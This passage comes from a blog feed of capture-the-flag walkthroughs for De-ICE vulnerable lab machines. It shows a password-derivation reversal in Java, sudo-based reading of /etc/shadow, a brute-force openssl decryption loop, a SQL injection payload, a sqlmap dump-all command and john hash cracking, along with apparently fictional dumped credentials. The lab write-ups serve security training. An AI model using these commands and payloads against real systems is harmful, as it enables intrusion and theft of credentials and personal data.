</span><span class='line'>         <span class="n">encArr</span><span class="o">=</span><span class="n">loopProcess</span><span class="o">(</span><span class="n">encArr</span><span class="o">);</span>
</span><span class='line'>
</span><span class='line'>         <span class="kt">int</span> <span class="n">j</span><span class="o">=</span><span class="n">encArr</span><span class="o">.</span><span class="na">length</span><span class="o">-</span><span class="mi">1</span><span class="o">;</span>
</span><span class='line'>
</span><span class='line'>         <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="o">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">encArr</span><span class="o">.</span><span class="na">length</span><span class="o">;</span><span class="n">i</span><span class="o">++){</span>
</span><span class='line'>           <span class="k">if</span><span class="o">(</span><span class="n">i</span><span class="o">==</span><span class="n">j</span><span class="o">)</span> <span class="k">break</span><span class="o">;</span>
</span><span class='line'>             <span class="kt">int</span> <span class="n">t</span><span class="o">=</span><span class="n">encArr</span><span class="o">[</span><span class="n">i</span><span class="o">];</span>
</span><span class='line'>             <span class="n">encArr</span><span class="o">[</span><span class="n">i</span><span class="o">]=</span><span class="n">encArr</span><span class="o">[</span><span class="n">j</span><span class="o">];</span>
</span><span class='line'>             <span class="n">encArr</span><span class="o">[</span><span class="n">j</span><span class="o">]=</span><span class="n">t</span><span class="o">;</span><span class="n">j</span><span class="o">--;}</span>
</span><span class='line'>     <span class="k">return</span> <span class="n">encArr</span><span class="o">;}</span>
</span><span class='line'>
</span><span class='line'>     <span class="cm">/*Note the pseudocode will be implemented with the </span>
</span><span class='line'><span class="cm">     root account and my account, we still need to implement it with the csadmin, sdadmin,   </span>
</span><span class='line'><span class="cm">     and dbadmin accounts though*/</span>
</span><span class='line'>
</span><span class='line'>     <span class="kd">static</span> <span class="kt">int</span><span class="o">[]</span> <span class="nf">backLoop</span><span class="o">(</span><span class="kt">int</span><span class="o">[]</span> <span class="n">input</span><span class="o">){</span>
</span><span class='line'>       <span class="kt">int</span> <span class="n">ref</span><span class="o">=</span><span class="n">input</span><span class="o">.</span><span class="na">length</span><span class="o">;</span>
</span><span class='line'>       <span class="kt">int</span> <span class="n">a</span><span class="o">=</span><span class="n">input</span><span class="o">[</span><span class="mi">1</span><span class="o">];</span> <span class="kt">int</span> <span class="n">b</span><span class="o">=</span><span class="n">input</span><span class="o">[</span><span class="n">ref</span><span class="o">-</span><span class="mi">1</span><span class="o">];</span>
</span><span class='line'>       <span class="kt">int</span> <span class="n">check</span><span class="o">=(</span><span class="n">a</span><span class="o">+</span><span class="n">b</span><span class="o">)/</span><span class="mi">2</span><span class="o">;</span>
</span><span class='line'>
</span><span class='line'>       <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="o">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">ref</span><span class="o">;</span><span class="n">i</span><span class="o">++){</span>
</span><span class='line'>         <span class="k">if</span><span class="o">(</span><span class="n">i</span><span class="o">%</span><span class="mi">2</span><span class="o">==</span><span class="mi">0</span><span class="o">)</span> <span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]=(</span><span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]%</span><span class="n">check</span><span class="o">)+(</span><span class="n">ref</span><span class="o">+</span><span class="n">i</span><span class="o">);</span>
</span><span class='line'>         <span class="k">else</span> <span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]=(</span><span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]+</span><span class="n">ref</span><span class="o">+</span><span class="n">i</span><span class="o">);}</span>
</span><span class='line'>     <span class="k">return</span> <span class="n">input</span><span class="o">;}</span>
</span><span class='line'>
</span><span class='line'>     <span class="kd">static</span> <span class="kt">int</span><span class="o">[]</span> <span class="nf">loopBack</span><span class="o">(</span><span class="kt">int</span><span class="o">[]</span> <span class="n">input</span><span class="o">){</span>
</span><span class='line'>       <span class="kt">int</span> <span class="n">ref</span><span class="o">=</span><span class="n">input</span><span class="o">.</span><span class="na">length</span><span class="o">/</span><span class="mi">2</span><span class="o">;</span>
</span><span class='line'>       <span class="kt">int</span><span class="o">[]</span> <span class="n">encNew</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">int</span><span class="o">[</span><span class="n">input</span><span class="o">.</span><span class="na">length</span><span class="o">+</span><span class="n">ref</span><span class="o">];</span>
</span><span class='line'>       <span class="kt">int</span> <span class="n">ch</span><span class="o">=</span><span class="mi">0</span><span class="o">;</span>
</span><span class='line'>       <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=(</span><span class="n">ref</span><span class="o">/</span><span class="mi">2</span><span class="o">);</span><span class="n">i</span><span class="o">&lt;</span><span class="n">input</span><span class="o">.</span><span class="na">length</span><span class="o">;</span><span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
</span><span class='line'>         <span class="n">encNew</span><span class="o">[</span><span class="n">i</span><span class="o">]=</span><span class="n">input</span><span class="o">[</span><span class="n">ch</span><span class="o">];</span> <span class="n">ch</span><span class="o">++;}</span>
</span><span class='line'>         <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="o">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">encNew</span><span class="o">.</span><span class="na">length</span><span class="o">;</span><span class="n">i</span><span class="o">++){</span>
</span><span class='line'>           <span class="k">if</span><span class="o">(</span><span class="n">encNew</span><span class="o">[</span><span class="n">i</span><span class="o">]&lt;=</span><span class="mi">33</span><span class="o">)</span> <span class="n">encNew</span><span class="o">[</span><span class="n">i</span><span class="o">]=</span><span class="mi">33</span><span class="o">+(++</span><span class="n">ref</span><span class="o">*</span><span class="mi">2</span><span class="o">);</span>
</span><span class='line'>           <span class="k">else</span> <span class="nf">if</span><span class="o">(</span><span class="n">encNew</span><span class="o">[</span><span class="n">i</span><span class="o">]&gt;=</span><span class="mi">126</span><span class="o">)</span> <span class="n">encNew</span><span class="o">[</span><span class="n">i</span><span class="o">]=</span><span class="mi">126</span><span class="o">-(--</span><span class="n">ref</span><span class="o">*</span><span class="mi">2</span><span class="o">);</span>
</span><span class='line'>           <span class="k">else</span><span class="o">{</span>
</span><span class='line'>             <span class="k">if</span><span class="o">(</span><span class="n">i</span><span class="o">%</span><span class="mi">2</span><span class="o">==</span><span class="mi">0</span><span class="o">)</span> <span class="n">encNew</span><span class="o">[</span><span class="n">i</span><span class="o">]-=(</span><span class="n">i</span><span class="o">%</span><span class="mi">3</span><span class="o">);</span>
</span><span class='line'>             <span class="k">else</span> <span class="n">encNew</span><span class="o">[</span><span class="n">i</span><span class="o">]+=(</span><span class="n">i</span><span class="o">%</span><span class="mi">2</span><span class="o">);}}</span>
</span><span class='line'>     <span class="k">return</span> <span class="n">encNew</span><span class="o">;}</span>
</span><span class='line'>
</span><span class='line'>     <span class="kd">static</span> <span class="kt">int</span><span class="o">[]</span> <span class="nf">loopProcess</span><span class="o">(</span><span class="kt">int</span><span class="o">[]</span> <span class="n">input</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>       <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="o">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">input</span><span class="o">.</span><span class="na">length</span><span class="o">;</span><span class="n">i</span><span class="o">++){</span>
</span><span class='line'>         <span class="k">if</span><span class="o">(</span><span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]==</span><span class="mi">40</span><span class="o">||</span><span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]==</span><span class="mi">41</span><span class="o">)</span> <span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]+=</span><span class="n">input</span><span class="o">.</span><span class="na">length</span><span class="o">;</span>
</span><span class='line'>         <span class="k">else</span> <span class="nf">if</span><span class="o">(</span><span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]==</span><span class="mi">45</span><span class="o">)</span> <span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]+=</span><span class="mi">20</span><span class="o">+</span><span class="n">i</span><span class="o">;}</span>
</span><span class='line'>     <span class="k">return</span> <span class="n">input</span><span class="o">;}</span>
</span><span class='line'>
</span><span class='line'>    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>        <span class="kt">int</span><span class="o">[]</span> <span class="n">a</span> <span class="o">=</span> <span class="n">processLoop</span><span class="o">(</span><span class="n">args</span><span class="o">[</span><span class="mi">0</span><span class="o">]);</span>
</span><span class='line'>        <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="o">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="n">a</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">print</span><span class="o">((</span><span class="kt">char</span><span class="o">)</span> <span class="n">a</span><span class="o">[</span><span class="n">i</span><span class="o">]);</span>
</span><span class='line'>        <span class="o">}</span>
</span><span class='line'>        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">();</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="n">root</span><span class="nd">@kali32</span><span class="o">:~</span><span class="err">#</span> <span class="n">javac</span> <span class="n">test</span><span class="o">.</span><span class="na">java</span>
</span></code></pre></td></tr></table></div></figure>


<p>We encrypt another usernames to get passwords.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# java test sysadmin
</span><span class='line'>7531/{{tor/rv/A
</span><span class='line'>root@kali32:~# java test root
</span><span class='line'>31/Fwxw+2</span></code></pre></td></tr></table></div></figure>


<p>Now we can log as sysadmin. Using sudo:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>User sysadmin may run the following commands on this host:
</span><span class='line'>    (root) NOEXEC: /bin/ls
</span><span class='line'>    (root) NOEXEC: /usr/bin/cat
</span><span class='line'>    (root) NOEXEC: /usr/bin/more
</span><span class='line'>    (root) NOEXEC: !/usr/bin/su *root*</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sysadmin@slax:~$ sudo cat /etc/shadow 
</span><span class='line'>root:$1$vEElgVNe$9nK8G715PgmFE4g1QyTII0:13553:0:::::
</span><span class='line'>bin:*:9797:0:::::
</span><span class='line'>daemon:*:9797:0:::::
</span><span class='line'>adm:*:9797:0:::::
</span><span class='line'>lp:*:9797:0:::::
</span><span class='line'>sync:*:9797:0:::::
</span><span class='line'>shutdown:*:9797:0:::::
</span><span class='line'>halt:*:9797:0:::::
</span><span class='line'>mail:*:9797:0:::::
</span><span class='line'>news:*:9797:0:::::
</span><span class='line'>uucp:*:9797:0:::::
</span><span class='line'>operator:*:9797:0:::::
</span><span class='line'>games:*:9797:0:::::
</span><span class='line'>ftp:*:9797:0:::::
</span><span class='line'>smmsp:*:9797:0:::::
</span><span class='line'>mysql:*:9797:0:::::
</span><span class='line'>rpc:*:9797:0:::::
</span><span class='line'>sshd:*:9797:0:::::
</span><span class='line'>gdm:*:9797:0:::::
</span><span class='line'>pop:*:9797:0:::::
</span><span class='line'>nobody:*:9797:0:::::
</span><span class='line'>sysadmin:$1$Nj4nHA2G$JbByYpmcxsXEiWAUObt1n0:13550:0:99999:7:::
</span><span class='line'>csadmin:$1$fL53QS96$x94h96zABA9MrbISq7VtZ1:13550:0:99999:7:::
</span><span class='line'>sdadmin:$1$hL8T9Cgk$0g4u8UgtkMn11OJ7sjsK00:13550:0:99999:7:::
</span><span class='line'>dbadmin:$1$dQwfzffm$kIXUGVFu3XZmm4jZNp6wa1:13550:0:99999:7:::</span></code></pre></td></tr></table></div></figure>


<p>Because we are in wheel group, we can invoke the command &lsquo;su&rsquo; directly to obtain the root access:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sysadmin@slax:~$ id
</span><span class='line'>uid=1000(sysadmin) gid=10(wheel) groups=10(wheel)
</span><span class='line'>sysadmin@slax:~$ su
</span><span class='line'>Password: *********
</span><span class='line'>root@slax:/home/sysadmin#</span></code></pre></td></tr></table></div></figure>


<p>From the home directory of sysadmin user, we locate the encrypted file in ftp and use
script for decryption, with the password of the root user:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@slax:~# cat /home/sysadmin/Note_to_self 
</span><span class='line'>Note:
</span><span class='line'>useracc_update.csv file has been moved to the ftp server and encrypted 
</span><span class='line'>for transfer to dbadmin's account.  These are only the updated values 
</span><span class='line'>for reference in the database.  
</span><span class='line'>We need to tailor to our new customers for the New Year!</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@slax:/home/ftp/incoming# cat crack-openssl.sh
</span><span class='line'><span class="c">#!/usr/bin/env bash</span>
</span><span class='line'>
</span><span class='line'>mkdir csv
</span><span class='line'><span class="nv">ciphers</span><span class="o">=</span><span class="sb">`</span>openssl list-cipher-commands<span class="sb">`</span>
</span><span class='line'>
</span><span class='line'><span class="k">for</span> c in <span class="nv">$ciphers</span><span class="p">;</span> <span class="k">do</span>
</span><span class='line'>  openssl enc -d -<span class="s2">&quot;$c&quot;</span> -in useracc_update.csv.enc -k <span class="s2">&quot;31/Fwxw+2&quot;</span> -out csv/useracc_update.csv.<span class="nv">$c</span>-decrypted 2&gt;/dev/ull
</span><span class='line'><span class="k">done</span>
</span><span class='line'>strings -n <span class="m">12</span> csv/*
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@slax:/home/ftp/incoming# ./crack-openssl.sh   
</span><span class='line'>ID,Last,First,Email,State,Username,Password,Verifacation Code,Pin code
</span><span class='line'>1000,Carr,Alfred,acarr23@gmail.com,NY,acarr9096,phantom4,952733,490
</span><span class='line'>1001,Karson,William,wkarson53@yahoo.com,NY,wkarson2431,rockallday123,567094,345
</span><span class='line'>1002,Wheeler,Cordy,megawheels98@rocketmail.com,NY,cwheeler5031,goeagles90,462724,631
</span><span class='line'>1003,Smith,Ken,synthesizer_1r@gmail.com,NY,ksmith6253,crystalization,636721,353
</span><span class='line'>1004,Quinn,Cynthia,qcq92@aol.com,NY,cquinn1217,archyandhenry,680247,223
</span><span class='line'>1005,Floyd,Wilson,jukeboxer_4life@gmail.com,NY,wfloyd5931,knockout66,521456,441
</span><span class='line'>1006,Blake,Markus,sil3nt_gunn3r@yahoo.com,NY,mblake6947,268768924,129632,557
</span><span class='line'>1007,Nash,Jillian,wiselife141@aol.com,NY,jnash0934,checkitout1,324672,315
</span><span class='line'>1008,Atkins,Alison,double_a44@hotmail.com,NY,aatkins9087,gogogo123123,457094,124
</span><span class='line'>1009,Oliver,Frank,fog_of_war0001@gmail.com,NY,foliver9385,falconpunch,783143,134
</span><span class='line'>1010,Jones,Edith,msjones677@hotmail.com,NY,ejones7532,chris12345,632620,579
</span><span class='line'>1011,Moore,Cody,aiprojectx@gmail.com,NY,dot_Cipher,crypTrace,101010,1337</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[DE-ICE-S1.120]]></title>
    <link href="http://73696e65.github.io/blog/2015/05/13/de-ice-s1-dot-120/"/>
    <updated>2015-05-13T15:54:08+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/05/13/de-ice-s1-dot-120</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/de-ice-s1120,10/">De-ICE: S1.120</a></p>

<p>Nmap output:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT     STATE SERVICE  VERSION
</span><span class='line'>21/tcp   open  ftp      ProFTPD 1.3.2
</span><span class='line'>22/tcp   open  ssh      OpenSSH 5.1 (protocol 2.0)
</span><span class='line'>80/tcp   open  http     Apache httpd 2.2.11 ((Unix) DAV/2 mod_ssl/2.2.11 OpenSSL/0.9.8k PHP/5.2.9 mod_apreq2-20051231/2.6.0 mod_perl/2.0.4 Perl/v5.10.0)
</span><span class='line'>443/tcp  open  ssl/http Apache httpd 2.2.11 ((Unix) DAV/2 mod_ssl/2.2.11 OpenSSL/0.9.8k PHP/5.2.9 mod_apreq2-20051231/2.6.0 mod_perl/2.0.4 Perl/v5.10.0)
</span><span class='line'>3306/tcp open  mysql    MySQL (unauthorized)
</span><span class='line'>MAC Address: 00:0C:29:53:2F:A3 (VMware)
</span><span class='line'>Service Info: OS: Unix</span></code></pre></td></tr></table></div></figure>


<p>Nikto output:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# nikto -h 192.168.1.120
</span><span class='line'>- Nikto v2.1.6
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Target IP:          192.168.1.120
</span><span class='line'>+ Target Hostname:    192.168.1.120
</span><span class='line'>+ Target Port:        80
</span><span class='line'>+ Start Time:         2015-05-07 00:29:50 (GMT2)
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Server: Apache/2.2.11 (Unix) DAV/2 mod_ssl/2.2.11 OpenSSL/0.9.8k PHP/5.2.9 mod_apreq2-20051231/2.6.0 mod_perl/2.0.4 Perl/v5.10.0
</span><span class='line'>+ Retrieved x-powered-by header: PHP/5.2.9
</span><span class='line'>+ The anti-clickjacking X-Frame-Options header is not present.
</span><span class='line'>+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var
</span><span class='line'>+ Server leaks inodes via ETags, header found with file /favicon.ico, inode: 8430, size: 30894, mtime: Fri May 11 14:40:36 2007
</span><span class='line'>+ mod_apreq2-20051231/2.6.0 appears to be outdated (current is at least 2.6.1)
</span><span class='line'>+ mod_perl/2.0.4 appears to be outdated (current is at least 2.0.7)
</span><span class='line'>+ Apache/2.2.11 appears to be outdated (current is at least Apache/2.4.7). Apache 2.0.65 (final release) and 2.2.26 are also current.
</span><span class='line'>+ mod_ssl/2.2.11 appears to be outdated (current is at least 2.8.31) (may depend on server version)
</span><span class='line'>+ PHP/5.2.9 appears to be outdated (current is at least 5.4.26)
</span><span class='line'>+ Perl/v5.10.0 appears to be outdated (current is at least v5.14.2)
</span><span class='line'>+ OpenSSL/0.9.8k appears to be outdated (current is at least 1.0.1e). OpenSSL 0.9.8r is also current.
</span><span class='line'>+ mod_ssl/2.2.11 OpenSSL/0.9.8k PHP/5.2.9 mod_apreq2-20051231/2.6.0 mod_perl/2.0.4 Perl/v5.10.0 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. CVE-2002-0082, OSVDB-756.
</span><span class='line'>+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
</span><span class='line'>+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
</span><span class='line'>+ OSVDB-3268: /webalizer/: Directory indexing found.
</span><span class='line'>+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
</span><span class='line'>+ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
</span><span class='line'>+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
</span><span class='line'>+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
</span><span class='line'>+ OSVDB-3092: /phpmyadmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
</span><span class='line'>+ OSVDB-3233: /cgi-bin/printenv: Apache 2.0 default script is executable and gives server environment variables. All default scripts should be removed. It may also allow XSS types of attacks. http://www.securityfocus.com/bid/4431.
</span><span class='line'>+ OSVDB-3233: /cgi-bin/test-cgi: Apache 2.0 default script is executable and reveals system information. All default scripts should be removed.
</span><span class='line'>+ OSVDB-3268: /icons/: Directory indexing found.
</span><span class='line'>+ OSVDB-3233: /icons/README: Apache default file found.
</span><span class='line'>+ /phpmyadmin/: phpMyAdmin directory found
</span><span class='line'>+ 7354 requests: 0 error(s) and 25 item(s) reported on remote host
</span><span class='line'>+ End Time:           2015-05-07 00:30:03 (GMT2) (13 seconds)
</span><span class='line'>---------------------------------------------------------------------------</span></code></pre></td></tr></table></div></figure>


<p>As we can see, Nikto reveals the installation of phpmyadmin and some minor
vulnerabilities. There is an information about CVE-2002-0082 too, but we didn&rsquo;t
find any exploit for the issue.</p>

<p>We connect to the web page, add a few products and try sql injection:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.1.120/products.php?id=2 or 1=1--+</span></code></pre></td></tr></table></div></figure>


<p>We found out that it works so we try sqlmap to dump the whole database content:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# sqlmap -u "http://192.168.1.120/products.php?id=1" -p id --dump-all</span></code></pre></td></tr></table></div></figure>


<p>This gives us the mysql sha1 hashes. After a small formating, we got:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/.sqlmap/output/192.168.1.120/dump/mysql# cat user-f3649c95.csv | cut -d, -f2-3 | sed 's#,#:#' > hashes.csv
</span><span class='line'>root@kali32:~/.sqlmap/output/192.168.1.120/dump/mysql# john --format=mysql-sha1 hashes.csv
</span><span class='line'>Loaded 50 password hashes with no different salts (MySQL 4.1 double-SHA-1 [128/128 SSE2 intrinsics 8x])
</span><span class='line'>123456           (bwatkins)
</span><span class='line'>12345            (ktso)
</span><span class='line'>password         (krenfro)
</span><span class='line'>12345678         (amaynard)
</span><span class='line'>abc123           (cchisholm)
</span><span class='line'>computer         (jalvarez)
</span><span class='line'>1234             (dwestling)
</span><span class='line'>qwerty           (tdeleon)
</span><span class='line'>internet         (sgains)
</span><span class='line'>shadow           (jfranklin)
</span><span class='line'>baseball         (kwebber)
</span><span class='line'>letmein          (dstevens)
</span><span class='line'>dragon           (bbanter)
</span><span class='line'>jordan           (mbryan)
</span><span class='line'>michael          (aweiland)
</span><span class='line'>michelle         (hlovell)
</span><span class='line'>trustno1         (rpatel)
</span><span class='line'>soccer           (dgrant)
</span><span class='line'>batman           (aadams)
</span><span class='line'>football         (mholland)
</span><span class='line'>iloveyou         (rdominguez)
</span><span class='line'>jennifer         (mrodriguez)
</span><span class='line'>master           (strammel)
</span><span class='line'>monkey           (jbresnahan)
</span><span class='line'>pepper           (djohnson)
</span><span class='line'>sunshine         (ccoffee)
</span><span class='line'>whatever         (aheflin)
</span><span class='line'>welcome          (jalcantar)
</span><span class='line'>111111           (jayala)
</span><span class='line'>654321           (bphillips)
</span><span class='line'>666666           (aspears)
</span><span class='line'>killer           (dcooper)
</span><span class='line'>princess         (kclemons)
</span><span class='line'>superman         (aharp)
</span><span class='line'>123123           (tgoodchap)
</span><span class='line'>1234567          (aallen)
</span><span class='line'>cheese           (lmorales)
</span><span class='line'>starwars         (myajima)
</span><span class='line'>Password         (mnader)
</span><span class='line'>nintendo         (dgilfillan)
</span><span class='line'>pokemon          (rjacobson)
</span><span class='line'>passw0rd         (lmartinez)
